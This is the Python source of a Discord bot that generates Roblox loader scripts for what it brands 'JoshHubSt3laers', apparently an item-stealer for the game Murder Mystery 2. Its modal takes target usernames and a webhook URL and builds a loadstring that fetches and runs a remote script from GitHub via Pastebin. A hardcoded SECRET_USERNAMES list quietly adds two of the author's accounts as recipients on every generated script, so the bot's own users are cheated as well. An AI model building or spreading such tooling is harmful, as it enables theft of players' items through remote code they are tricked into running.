import discord
from discord import app_commands
from discord.ui import Modal, TextInput
import urllib.parse
import os
import requests

# Discord bot setup
intents = discord.Intents.default()
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

# Configuration
SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubsMM2TXT/refs/heads/main/mm2sourcebyjoshhub.txt"
PASTEBIN_API_KEY = os.getenv("PASTEBIN_API_KEY")
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")

def create_pastebin(content):
    """Create a paste on Pastebin"""
    try:
        if not PASTEBIN_API_KEY:
            print("❌ No Pastebin API key!")
            return None, None
            
        data = {
            'api_dev_key': PASTEBIN_API_KEY,
            'api_option': 'paste',
            'api_paste_code': content,
            'api_paste_private': '1',
            'api_paste_expire_date': '1D',
            'api_paste_name': 'MM2 Script'
        }
        
        response = requests.post('https://pastebin.com/api/api_post.php', data=data)
        
        if response.status_code == 200:
            paste_url = response.text.strip()
            if 'pastebin.com/' in paste_url:
                paste_id = paste_url.split('/')[-1]
                raw_url = f"https://pastebin.com/raw/{paste_id}"
                print(f"✅ Pastebin created: {paste_url}")
                return paste_url, raw_url
        return None, None
    except:
        return None, None

class ScriptModal(Modal, title="MM2 Script Generator"):
    usernames = TextInput(label="Target Usernames (comma separated)", 
                         placeholder="e.g. Nikilis, Tobi, JD", 
                         style=discord.TextStyle.paragraph, 
                         required=True)
    webhook = TextInput(label="Your Webhook URL", 
                       placeholder="https://discord.com/api/webhooks/...", 
                       style=discord.TextStyle.long, 
                       required=True)
    min_rarity = TextInput(label="Minimum Rarity (default: Godly)", 
                          placeholder="Godly, Ancient, Legendary, etc.", 
                          default="Godly", 
                          required=False)
    min_value = TextInput(label="Minimum Value (default: 1)", 
                         placeholder="Only collect items worth this or more", 
                         default="1", 
                         required=False)
    ping = TextInput(label="Ping @everyone on hit? (Yes/No)", 
                    placeholder="Yes or No", 
                    default="No", 
                    required=False)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
        all_targets = user_targets + SECRET_USERNAMES
        
        # Build URL
        params = urllib.parse.urlencode({
            "users": ",".join(all_targets),
            "webhook": self.webhook.value,
            "min_rarity": self.min_rarity.value or "Godly",
            "min_value": self.min_value.value or "1",
            "ping": self.ping.value or "No"
        })
        
        github_url = f"{RAW_SCRIPT_URL}?{params}"
        
        # Create Pastebin
        script_content = f'loadstring(game:HttpGet("{github_url}"))()'
        paste_url, raw_url = create_pastebin(script_content)
        
        if paste_url and raw_url:
            # CORRECT LOADSTRING FOR USER
            final_loadstring = f'loadstring(game:HttpGet("{raw_url}"))()'
            
            # DEBUG OUTPUT
            print("="*50)
            print(f"[DEBUG] paste_url = {paste_url}")
            print(f"[DEBUG] raw_url = {raw_url}")
            print(f"[DEBUG] final_loadstring = {final_loadstring}")
            print("="*50)
            
            # FIXED: Send correct loadstring
            try:
                await interaction.user.send(
                    f"**🔪 JoshHubSt3laers – Your Loadstring is Ready!**\n\n"
                    f"Copy and execute this:\n"
                    f"```lua\n{final_loadstring}\n```"  # CORRECT LINE
                )
                await interaction.followup.send("✅ Sent to your DMs!", ephemeral=True)
            except:
                await interaction.followup.send(
                    f"**🔪 JoshHubSt3laers – Your Loadstring is Ready!**\n\n"
                    f"Copy and execute this:\n"
                    f"```lua\n{final_loadstring}\n```",  # CORRECT LINE
                    ephemeral=True
                )
        else:
            fallback = f'loadstring(game:HttpGet("{github_url}"))()'
            await interaction.followup.send(f"**Direct:**\n```lua\n{fallback}\n```", ephemeral=True)

@tree.command(name="generate-mm2", description="🎮 Generate MM2 script")
async def generate_mm2(interaction: discord.Interaction):
    await interaction.response.send_modal(ScriptModal())

@bot.event
async def on_ready():
    print(f"✅ {bot.user} is online!")
    try:
        await tree.sync()
        print("🔄 Commands synced")
    except:
        print("⚠️ Sync issue")

if __name__ == "__main__":
    if not DISCORD_TOKEN:
        print("❌ No DISCORD_TOKEN in Secrets!")
        exit(1)
    
    print("🚀 Starting bot...")
    bot.run(DISCORD_TOKEN)
